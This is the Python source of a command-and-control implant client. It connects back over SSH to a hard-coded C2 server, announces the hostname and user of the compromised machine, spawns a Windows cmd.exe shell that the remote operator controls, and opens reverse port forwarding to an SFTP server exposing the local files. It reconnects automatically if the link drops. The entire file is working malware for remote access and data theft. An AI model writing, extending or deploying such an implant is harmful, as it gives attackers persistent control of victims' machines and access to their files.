import paramiko
import subprocess
import os
import sys
import socket
import getpass
import time
import logging
import argparse
import platform
import threading
from typing import Dict, Any, Optional, Callable
from .sftp.stub_sftp import StubServer, StubSFTPServer

# logging setup
inglogging = logging.getLogger('C2Client')
logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[logging.StreamHandler()]
)

# Generate a host key for the SFTP server
HOST_KEY = paramiko.RSAKey.generate(2048)

class PortForwardingManager:
    """
    A class to manage port forwarding separately from other functionality.
    This allows the port forwarding to be reused for different purposes.
    """
    def __init__(self, transport, channel):
        self.transport = transport
        self.channel = channel
        self.forwarding_threads = {}
        self.running = True

    def start_forwarding(self, remote_port: int, handler_factory: Callable) -> bool:
        """
        Start remote port forwarding with a custom channel handler
        
        Args:
            remote_port: The port to forward from the remote server
            handler_factory: A callable that returns a function to handle each accepted channel
            
        Returns:
            bool: True if forwarding was successfully set up
        """
        # Check if already forwarding on this port
        if remote_port in self.forwarding_threads and self.forwarding_threads[remote_port].is_alive():
            self.channel.send(f"\r\nAlready forwarding on port {remote_port}\r\n")
            return True
            
        # Request port forwarding from the server
        try:
            self.transport.request_port_forward('', remote_port)
            logging.info(f"Requested remote port forwarding on port {remote_port}")
            self.channel.send(f"\r\nForwarding started on {remote_port}\r\n")
        except Exception as e:
            logging.error(f"Port forward request failed: {e}")
            self.channel.send(f"\r\nPort forwarding failed: {e}\r\n")
            return False

        # Thread to accept forwarded channels
        def accept_forwarded():
            port_running = True
            while self.running and port_running:
                chan = self.transport.accept(1)
                if not chan:
                    continue
                logging.info(f"Incoming forwarded-tcpip channel on port {remote_port}")
                
                # Start a new thread to handle this channel
                handler = handler_factory(chan)
                t = threading.Thread(target=handler, daemon=True)
                t.start()
                
            logging.info(f"Stopped accepting connections on port {remote_port}")

        # Start the forwarding thread
        forward_thread = threading.Thread(target=accept_forwarded, daemon=True)
        self.forwarding_threads[remote_port] = forward_thread
        forward_thread.start()
        return True

    def stop_forwarding(self, remote_port: int) -> bool:
        """
        Stop forwarding on the specified port
        
        Args:
            remote_port: The port to stop forwarding
            
        Returns:
            bool: True if forwarding was successfully stopped
        """
        if remote_port not in self.forwarding_threads:
            self.channel.send(f"\r\nNo forwarding active on port {remote_port}\r\n")
            return True
            
        try:
            self.transport.cancel_port_forward('', remote_port)
            self.channel.send(f"\r\nCancelled forwarding on port {remote_port}\r\n")
            # The thread will exit on next accept() timeout
            if self.forwarding_threads[remote_port].is_alive():
                self.forwarding_threads[remote_port].join(2)
            del self.forwarding_threads[remote_port]
            return True
        except Exception as e:
            logging.error(f"Cancel port forward failed: {e}")
            self.channel.send(f"\r\nError cancelling port forward: {e}\r\n")
            return False

    def stop_all_forwarding(self):
        """Stop all active port forwarding"""
        ports = list(self.forwarding_threads.keys())
        for port in ports:
            self.stop_forwarding(port)
        self.running = False


class SFTPService:
    """
    A class to provide SFTP service functionality.
    Uses the port forwarding manager for the underlying transport.
    """
    def __init__(self, forwarder: PortForwardingManager):
        self.forwarder = forwarder
        self.active_ports = set()

    def create_sftp_handler(self, channel):
        """Create a handler function for SFTP channels"""
        def handle_sftp_channel():
            t = paramiko.Transport(channel)
            t.add_server_key(HOST_KEY)
            StubSFTPServer.ROOT = os.getcwd()
            t.set_subsystem_handler('sftp', paramiko.SFTPServer, StubSFTPServer)
            server = StubServer()
            try:
                t.start_server(server=server)
                # serve until closed
                while t.is_active() and self.forwarder.running:
                    time.sleep(0.5)
            finally:
                t.close()
                
        return handle_sftp_channel

    def start_sftp_server(self, remote_port=3333):
        """Start SFTP server on the specified port"""
        result = self.forwarder.start_forwarding(
            remote_port, 
            self.create_sftp_handler
        )
        if result:
            self.active_ports.add(remote_port)
        return result

    def stop_sftp_server(self, remote_port=3333):
        """Stop SFTP server on the specified port"""
        result = self.forwarder.stop_forwarding(remote_port)
        if result and remote_port in self.active_ports:
            self.active_ports.remove(remote_port)
        return result

    def stop_all_servers(self):
        """Stop all SFTP servers"""
        ports = list(self.active_ports)
        for port in ports:
            self.stop_sftp_server(port)


class C2Client:
    def __init__(self, config: Dict[str, Any]):
        self.config = config
        self.ssh_client = None
        self.transport = None
        self.channel = None
        self.process = None
        self.running = True
        self.reconnect_delay = 5
        self.system_info = self._gather_system_info()
        self.forwarder = None
        self.sftp_service = None

    def _gather_system_info(self) -> Dict[str, str]:
        return {
            'hostname': socket.gethostname(),
            'username': getpass.getuser(),
            'platform': platform.system(),
            'version': platform.version(),
            'architecture': platform.machine()
        }

    def connect(self) -> bool:
        try:
            self.ssh_client = paramiko.SSHClient()
            self.ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            logging.debug(f"Connecting to {self.config['server_ip']}:{self.config['server_port']}")
            self.ssh_client.connect(
                self.config['server_ip'],
                port=self.config['server_port'],
                username=self.config['username'],
                password=self.config['password'],
                timeout=10
            )
            self.transport = self.ssh_client.get_transport()
            self.channel = self.transport.open_session()
            self.channel.get_pty(term='vt100', width=80, height=24)
            self.channel.invoke_shell()

            if self.channel.active:
                # Initialize port forwarding manager and services
                self.forwarder = PortForwardingManager(self.transport, self.channel)
                self.sftp_service = SFTPService(self.forwarder)

                client_info = (
                    f"Implant checked in from {self.system_info['hostname']} "
                    f"as {self.system_info['username']}\r\n"
                )
                self.channel.send(client_info)
                logging.info("Successfully connected to C2 server")
                return True
            return False
        except Exception as e:
            logging.error(f"Connection error: {e}")
            return False

    def start_shell(self) -> bool:
        """Spawn a local Windows shell via winpty."""
        try:
            import winpty
            self.pty = winpty.PTY(cols=80, rows=24)
            proc_path = os.path.join(os.environ['SYSTEMROOT'], 'System32', 'cmd.exe')
            self.process = self.pty.spawn(proc_path)
            return True
        except Exception as e:
            logging.error(f"Error starting shell: {e}")
            return False

    def forward_io(self):
        def read_from_process():
            while self.running and self.pty and self.channel and self.channel.active:
                data = self.pty.read()
                if data:
                    self.channel.send(data.encode())
        
        def read_from_channel():
            while self.running and self.channel.active:
                if self.channel.recv_ready():
                    data = self.channel.recv(1024).decode()
                    if self.process_command(data):
                        continue
                    self.pty.write(data)
                else:
                    time.sleep(0.05)

        t1 = threading.Thread(target=read_from_process, daemon=True)
        t2 = threading.Thread(target=read_from_channel, daemon=True)
        t1.start(); t2.start()
        while t1.is_alive() and t2.is_alive() and self.running:
            time.sleep(0.5)

    def process_command(self, command: str):
        parts = command.strip().split()
        if not parts:
            return False
        
        # SFTP commands
        if parts[0] == '!sftp':
            if len(parts) >= 2 and parts[1] == 'start':
                port = int(parts[2]) if len(parts) > 2 else 3333
                return self.sftp_service.start_sftp_server(port)
            if len(parts) >= 2 and parts[1] == 'stop':
                port = int(parts[2]) if len(parts) > 2 else 3333
                return self.sftp_service.stop_sftp_server(port)
            self.channel.send("Usage: !sftp start|stop [port]\r\n")
            return True
            
        # General forwarding commands (for any service)
        if parts[0] == '!forward':
            if len(parts) < 3:
                self.channel.send("Usage: !forward start|stop SERVICE PORT\r\n")
                return True
                
            action = parts[1]
            service = parts[2]
            port = int(parts[3]) if len(parts) > 3 else 3333
                
            if action == 'start':
                if service == 'sftp':
                    return self.sftp_service.start_sftp_server(port)
                else:
                    self.channel.send(f"Unknown service: {service}\r\n")
                    return True
            elif action == 'stop':
                if service == 'sftp':
                    return self.sftp_service.stop_sftp_server(port)
                else:
                    self.channel.send(f"Unknown service: {service}\r\n")
                    return True
            else:
                self.channel.send("Unknown action. Use start or stop.\r\n")
                return True
                
        # other !get !put handled here...
        return False

    def command_loop(self):
        while self.running:
            if not self.channel or not self.channel.active:
                logging.info("Reconnecting...")
                self.disconnect()
                time.sleep(self.reconnect_delay)
                if not self.connect():
                    continue
                self.start_shell()
                threading.Thread(target=self.forward_io, daemon=True).start()
            time.sleep(1)

    def disconnect(self):
        self.running = False
        try:
            # Stop all port forwarding
            if self.forwarder:
                self.forwarder.stop_all_forwarding()
            
            # Close channels and connections
            if self.channel:
                self.channel.close()
            if self.ssh_client:
                self.ssh_client.close()
        except Exception:
            pass

    def run(self):
        if self.connect():
            self.start_shell()
            threading.Thread(target=self.forward_io, daemon=True).start()
            self.command_loop()


def parse_arguments():
    p = argparse.ArgumentParser()
    p.add_argument("--server", default="192.168.10.135")
    p.add_argument("--port", type=int, default=2222)
    p.add_argument("--username", default="implant")
    p.add_argument("--password", default="implant")
    p.add_argument("--debug", action="store_true")
    return p.parse_args()


def main():
    args = parse_arguments()
    if args.debug:
        logging.getLogger('C2Client').setLevel(logging.DEBUG)
    cfg = {'server_ip': args.server, 'server_port': args.port,
           'username': args.username, 'password': args.password}
    C2Client(cfg).run()


if __name__ == '__main__':
    main()